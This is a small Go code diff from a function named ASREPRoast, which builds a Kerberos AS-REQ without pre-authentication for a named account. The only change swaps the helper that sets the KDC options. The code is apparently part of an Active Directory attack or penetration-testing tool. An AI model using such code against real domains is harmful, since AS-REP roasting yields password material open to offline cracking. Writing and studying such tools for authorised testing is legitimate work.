@@ -45,7 +45,7 @@ func ASREPRoast(username, realm, kdcHost string) (*ASREPRoastResult, error) {
 		MsgType: messages.MsgTypeASReq,
 		// No PAData — absence of pre-auth is what makes the account vulnerable.
 		ReqBody: messages.KDCReqBody{
-			KDCOptions: kdcOptionsForwardable(),
+			KDCOptions: kdcOptionsForASReq(),
 			CName: messages.PrincipalName{
 				NameType:   messages.NameTypePrincipal,
 				NameString: []string{username},
